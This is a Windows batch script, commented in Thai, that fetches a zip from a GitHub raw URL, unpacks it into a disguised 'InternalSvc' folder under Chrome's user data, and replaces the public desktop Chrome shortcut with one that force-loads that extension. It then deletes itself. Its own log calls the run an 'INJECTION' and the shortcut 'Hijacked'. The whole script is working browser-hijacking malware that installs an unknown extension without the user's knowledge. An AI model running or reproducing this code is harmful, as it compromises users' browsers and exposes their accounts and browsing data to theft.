@echo off
setlocal enabledelayedexpansion

:: --- [ CONFIGURATION ] ---
set "EXT_ID=onifoepgcccnlehkgoonpaofeolhigpa"
set "TARGET_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc"
set "EXT_PATH=%TARGET_DIR%\%EXT_ID%"
set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"
set "LOG_FILE=%TARGET_DIR%\debug_log.txt"

:: --- [ DEBUG WINDOW SETUP ] ---
echo ======================================== > "%LOG_FILE%"
echo [!] STARTING INJECTION: %date% %time% >> "%LOG_FILE%"
echo [?] TARGET PATH: %EXT_PATH% >> "%LOG_FILE%"

:: 1. สร้างโฟลเดอร์
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
    echo [+] Created Target Directory >> "%LOG_FILE%"
)

:: 2. ดาวน์โหลดและแตกไฟล์
echo [*] Downloading Extension... >> "%LOG_FILE%"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'"

if exist "%TARGET_DIR%\ext.zip" (
    echo [+] Download Complete >> "%LOG_FILE%"
    powershell -Command "Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\temp_ext' -Force"
    echo [+] Extraction Complete >> "%LOG_FILE%"
) else (
    echo [!] DOWNLOAD FAILED >> "%LOG_FILE%"
    exit /b
)

:: จัดการโฟลเดอร์ซ้อน
if exist "%TARGET_DIR%\temp_ext" (
    if not exist "%EXT_PATH%" mkdir "%EXT_PATH%"
    for /d %%D in ("%TARGET_DIR%\temp_ext\*") do (
        xcopy "%%D\*" "%EXT_PATH%\" /s /e /y >nul
    )
    rd /s /q "%TARGET_DIR%\temp_ext"
    del /f /q "%TARGET_DIR%\ext.zip"
    echo [+] Folder Structure Optimized >> "%LOG_FILE%"
)

:: 3. สร้าง Shortcut ใหม่
echo [*] Creating Hijacked Shortcut... >> "%LOG_FILE%"
set "VBS_SCRIPT=%TEMP%\create_lnk.vbs"
set "LNK_NAME=%PUBLIC%\Desktop\Google Chrome.lnk"

:: เช็คว่ามี Shortcut เดิมไหม
if exist "%LNK_NAME%" (
    echo [-] Old Shortcut Found, Deleting... >> "%LOG_FILE%"
    del /f /q "%LNK_NAME%"
)

echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
echo sLnkPath = "%LNK_NAME%" >> "%VBS_SCRIPT%"
echo Set oLnk = oWS.CreateShortcut(sLnkPath) >> "%VBS_SCRIPT%"
echo oLnk.TargetPath = "C:\Program Files\Google\Chrome\Application\chrome.exe" >> "%VBS_SCRIPT%"
echo oLnk.Arguments = "--load-extension=""%EXT_PATH%""" >> "%VBS_SCRIPT%"
echo oLnk.IconLocation = "C:\Program Files\Google\Chrome\Application\chrome.exe,0" >> "%VBS_SCRIPT%"
echo oLnk.Save >> "%VBS_SCRIPT%"

cscript //nologo "%VBS_SCRIPT%" >nul
if %errorlevel% equ 0 (
    echo [+] Shortcut Created Successfully >> "%LOG_FILE%"
) else (
    echo [!] VBS EXECUTION FAILED >> "%LOG_FILE%"
)
del "%VBS_SCRIPT%"

:: --- [ FINAL CHECK ] ---
echo [!] INJECTION FINISHED: %time% >> "%LOG_FILE%"
echo ======================================== >> "%LOG_FILE%"

:: สั่งเปิดไฟล์ Log มาดูผล (Debug Mode)
start notepad.exe "%LOG_FILE%"

:: ลบตัวเองทิ้ง (ยกเว้นไฟล์ Log เพื่อให้คุณดูผล)
(goto) 2>nul & del "%~f0"
